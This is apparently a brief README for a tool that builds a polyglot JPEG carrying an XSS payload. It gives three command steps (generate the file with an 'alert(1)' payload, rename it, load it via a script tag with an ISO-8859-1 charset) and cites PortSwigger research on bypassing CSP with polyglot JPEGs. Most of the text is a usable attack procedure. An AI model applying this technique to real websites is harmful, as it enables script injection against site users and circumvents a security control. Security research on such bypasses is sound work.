# XSS_JPEG
### create XSS JPEG file and Trigger XSS

1. python3 xss_jpeg.py "alert(1)"
2. mv xss.jpeg xss.txt // Content-Type image/jpeg -> text/plain
3. <script charset="ISO-8859-1" src="xss.txt">

reference: https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs
